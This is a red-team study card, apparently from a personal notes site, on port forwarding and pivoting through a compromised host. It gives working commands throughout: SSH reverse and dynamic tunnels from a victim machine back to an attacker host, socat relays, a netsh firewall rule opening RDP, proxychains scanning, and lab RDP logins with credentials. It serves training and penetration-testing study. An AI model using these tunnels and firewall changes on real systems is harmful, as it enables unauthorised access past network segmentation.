---
{"dg-publish":true,"permalink":"/cards/red-team/port-forwarding/"}
---

~ [[cards/red-team/lateral movement and pivoting\|lateral movement and pivoting]]
## Summary
---
**What it is:** Technique for relaying traffic through a compromised host to access internal services and bypass segmentation or firewall restrictions.  
**Scope:** Covers SSH local/remote/dynamic tunneling and simple TCP relays (e.g., socat) for lateral movement; excludes tooling syntax, exploit code, and firewall evasion techniques beyond conceptual usage.  
**Key Topics:** Network pivoting, SSH tunneling, jump hosts, segmentation bypass, dynamic forwarding, SOCKS proxies, TCP relays, internal service access.
## How it works
---
Port forwarding leverages a compromised host as a **pivot point** to reach internal services that are not directly accessible from the attacker’s machine. Using SSH tunnels or TCP relay tools, traffic is forwarded from one machine to another so that the destination service sees requests originating from the pivot host.  
Administrators use similar mechanisms for remote support and secure access, while adversaries use them to reach RDP, SMB, WinRM, web interfaces, or other internal ports otherwise blocked by firewalls or segmentation.

## Steps
---
**Attacker objective:** Reach restricted internal services on {TARGET} by relaying traffic through a compromised pivot system.

### **Conceptual workflow:**

1. Identify a compromised host that has better internal network reach than the attacker’s machine.
    
2. Select a forwarding method:
    
    - **Remote forwarding** to project internal ports back to the attacker.
        
    - **Local forwarding** to expose attacker services to the pivot host.
        
    - **Dynamic forwarding** to route arbitrary connections through a SOCKS proxy.
        
3. Establish an authenticated tunnel (e.g., SSH) or a TCP relay (e.g., socat) that binds a local port and forwards traffic to the internal service.
    
4. Access the desired service by connecting to the forwarded port rather than the real internal IP.
    
5. Use forwarded access to perform scans, authentication attempts, remote desktop sessions, or additional lateral movement operations.
## Steps
---
Most of the lateral movement techniques we have presented require specific ports to be available for an attacker. In real-world networks, the administrators may have blocked some of these ports for security reasons or have implemented segmentation around the network, preventing you from reaching SMB, RDP, WinRM or RPC ports.

To go around these restrictions, you can use port forwarding techniques, which consists of using any compromised **JUMP** host as a jump box to pivot to other hosts. It is expected that some machines will have more network permissions.

### SSH Tunneling
---

- Windows now ships with OpenSSH client by default.

The scenario is you have compromised **PC-1** (it does not need admin access) and you would like to use it as a pivot to access a port on another machine to which the attacker machine cannot directly connect.
![lateral movement and pivoting - 23.png](/img/user/cards/red-team/images/lateral%20movement%20and%20pivoting%20-%2023.png)

1. Start a tunnel at **PC-1** macine, acting as SSH client.
2. Attacker's PC will act as an SSH server. (Since Windows machines often only have SSH client)

You need to create a separate SSH user for tunneling because **you need the pivot machine to SSH into your attacker machine**

```C
useradd tunneluser -m -d /home/tunneluser -s /bin/true
passwd tunneluser
```

But you **don’t want to give it real shell access**.

You only need it to:

- authenticate via SSH
- establish the tunnel
- nothing else
- for demonstration sake tunneluser:password

If the compromised machine had full shell access on your attacker machine, that would be extremely dangerous. 

Scenario:

**blue team takes over PC‑1**  
they could SSH back into your attacker machine **using your real account** if you used your main user.

**The attacker machine must accept SSH connections**
In this scenario:

- PC‑1 (pivot machine) → SSH → Attacker machine
- PC‑1 uses SSH _client_
- Attacker machine must run SSH _server_

You need a user account on the attacker machine that the pivot can authenticate with.

**SSH tunnels require authentication**

> [!question]- Why do we even need to do this? we already have access to the victim, why not use the victim machine?
> 1. You often only have a shell, PC-1 has access to internal network (e.g., can RDP to a server) but you cannot run RDP from shell.
> 2. Run tools that don't exists or cannot exists on the victim machine. (OR easily detected by security solutions)
> 3. You may need to attack multiple internal hosts.
> 4. Running tools on PC-1 is too noisy/dangerous

### SSH Remote Port Forwarding
---
Let's assume that the firewall blocks the attacker's machine from directly accessing port 3389 on the server. if the attacker has previously compromised **PC-1** and, in turn, **PC-1** has access to port 3389 of the server, it can be used to pivot to port 3389 using remote port forwarding from **PC-1.** 

Basically in **PC-1** you take a reachable port (3389) and project it into remote SSH server (the attacker's machine) resulting into a port being opened in to the attacker's machine that can be used to connect back to port 3389 in the server through SSH tunnel. **PC-1** will proxy the connection so the server will see traffic from **PC-1**.

![lateral movement and pivoting - 23-1.png](/img/user/cards/red-team/images/lateral%20movement%20and%20pivoting%20-%2023-1.png)

To forward port 3389 on the server back to our attacker's machine, you can use the command on VICTIM machine:

```C
ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N
```

Since the `tunneluser` isn't allowed to run a shell on the Attacker PC, we need to run the `ssh` command with the `-N` switch to prevent the client from requesting one, or the connection will exit immediately.

- The first 3389 is the 'fake port' or the port that will open on your attacker's machine.
- The last is the actual port from the internal server.

Once our tunnel is set and running, we can go to the attacker's machine and RDP into the forwarded port to reach the server:

Attacker's Machine

```C
munra@attacker-pc$ xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPassword
```

**Why you RDP to 127.0.0.1 instead of the internal server?**

Because **SSH replaced 127.0.0.1:3389 on your attacker machine with a tunnel that leads to the internal server**. 

Remember me?
```C
-R 3389:3.3.3.3:3389
```

Anything sent to `attacker:3389` goes to **3.3.3.3:3389** (the real internal server).

### SSH Local Port Forwarding
---
**Local port forwarding** allows us to "pull" a port from an SSH server into the SSH client. That way, any host that can't connect directly to the attacker's PC but can connect to PC-1 will now be able to reach the attacker's services through the pivot host.

PC‑1 -> forwards attacker’s service -> to itself

![lateral movement and pivoting - 24.png](/img/user/cards/red-team/images/lateral%20movement%20and%20pivoting%20-%2024.png)

To forward port 80 from the attacker's machine and make it available from PC-1, we can run the following command on PC-1:

```C
ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N
```

- `ssh tunneluser@1.1.1.1 ` - PC‑1 connects **to the attacker machine** using SSH.
- `-L` - Open a port on _PC‑1_ and forward traffic to the attacker.
- `*:80` - Create a listening socket on **PC‑1**, on port 80, available to ALL interfaces ("`*`") in other words "Bind port 80 to ALL IP addresses on this machine".
- `127.0.0.1:80` - When PC‑1 receives traffic on port 80, forward it through SSH to 127.0.0.1:80 _on the attacker machine_.

### Port Forwarding With socat 
--- -
- SSH not available. 
- Not as flexible ash SSH. 
- Disadvantage: transfer socat to pivot host. 
- Worth a try if no other option is available.

```C
socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389
```

![lateral movement and pivoting - 26.png](/img/user/cards/red-team/images/lateral%20movement%20and%20pivoting%20-%2026.png)

 - The `fork` option allows `socat` to fork a new process for each connection received, making it possible to handle multiple connections without closing it. 
 - **Note** that socat can't forward the connection directly to the attacker's machine as SSH did but will open a port on PC-1 that the attacker's machine can then connect to. 
 - The difference between SSH and Socat is in SSH the attacker only listens for incoming connections wherein socat the attacker must initiate the connection.
 
 You might need to create a firewall rule to allow any connections to that port:

```C
netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow protocol=TCP localport=3389
```

The opposite: If you want to expose a port from the attacker's machine and make it reachable by the server:

```C
socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80
```

Output: 

![lateral movement and pivoting - 27.png](/img/user/cards/red-team/images/lateral%20movement%20and%20pivoting%20-%2027.png)

### Dynamic Port Forwarding and SOCKS 
--- 
There are times when you might need to run scans against many ports of a host, or even many ports across many machines, all through a pivot host. **Dynamic port forwarding**allows you to pivot through a host and establish several connections to any IP addresses/ports you want by using a **SOCKS proxy**. 

Since relying on SSH server on Windows client is not a good idea establishing a reverse dynamic port forwarding with the command:

```C
ssh tunneluser@1.1.1.1 -R 9050 -N
```

- `ssh tunneluser@1.1.1.1` - PC1 connects OUT to the attacker’s SSH server -
- `-R 9050` - Reverse port forward — create a listener on the attacker machine 
- `9050` - The port on the attacker where a SOCKS proxy will run 
- `-N` - Do not open a shell, just open the tunnel 

Dynamic port forwarding turns SSH into a **SOCKS proxy**. A SOCKS proxy can forward **any connection to any IP:port**, not just a single port. 

So instead of forwarding _one port_, we forward _anything_ we send through SOCKS. 

Proxychains sends any program’s network traffic into a proxy such as SOCKS4/5. The proxychains configuration file can be found at `/etc/proxychains.conf`:

```C
[ProxyList] socks4  127.0.0.1 9050 // migh be a good idea to change the port number.
```

Usage example:

```C
proxychains curl http://pxeboot.za.tryhackme.com
```

This forces `curl` to: 

1. Send request to proxychains 
2. Proxychains redirects traffic to `127.0.0.1:9050` 
3. SSH SOCKS proxy sends it over the tunnel 
4. PC1 makes the actual connection to the internal host
5. Response goes back through the tunnel to you 

This is used for: 

- Internal port scanning 
- Web browsing inside a network 
- Using tools like curl, sqlmap, firefox, etc., through a pivot 

#### Workflow 
--- 
1. Connect to THMIIS via RDP. 
2. Connecting directly from our attacker machine - firewall filtered port 3389. 
3. Port is up and running can only be accessed from THMJMP2. 
4. Use `socat` on THMJMP2, you will forward the RDP port to make it available on THMJMP2 to connect from our attacker's machine.

```C
socat TCP4-LISTEN:14444,fork TCP4:THMIIS.za.tryhackme.com:3389
```

Note that we can't use port 3389 for our listener since it is already being used in THMJMP2 for its own RDP service:

```C
xfreerdp /v:THMJMP2.za.tryhackme.com:14444 /u:t1_thomas.moore /p:MyPazzw3rd2020
```

